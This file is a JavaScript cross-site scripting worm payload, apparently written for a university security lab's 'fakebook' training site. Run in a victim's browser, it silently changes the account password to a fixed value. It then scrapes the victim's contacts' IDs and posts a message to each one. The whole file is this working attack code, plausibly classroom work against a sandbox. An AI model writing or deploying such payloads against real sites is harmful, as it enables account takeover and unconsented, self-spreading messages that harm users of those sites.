//alert("haHA");
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://secenv.seclab.tuwien.ac.at/fakebook/fakebook.pl?sub=changepw&newpw=W0rm43v0r&newpwrep=W0rm43v0r", false );
xmlHttp.send( null );

xmlHttp.open( "GET", "https://secenv.seclab.tuwien.ac.at/fakebook/fakebook.pl?sub=detail", false );
xmlHttp.send( null );

var source = xmlHttp.responseText;
source = source.match(/fakebook\.pl\?sub=detail&id=[a-zA-Z0-9 ]+">/g);
//source = source.replace("fakebook\.pl\?sub=detail&id=", "");
//source = source.replace('">', '');

for (i = 0; i < source.length; i++) { 
    source[i] = source[i].replace("fakebook\.pl\?sub=detail&id=", "");
	source[i] = source[i].replace('">', '');
	
	xmlHttp.open( "GET", "https://secenv.seclab.tuwien.ac.at/fakebook/fakebook.pl?sub=detail&id="+source[i]+"&newmsg=Tomorrow, 7am, East Lane 20", false );
	xmlHttp.send( null );
}

//alert("worked");

// fakebook\.pl\?sub=detail&id=[a-zA-Z0-9 ]+">/g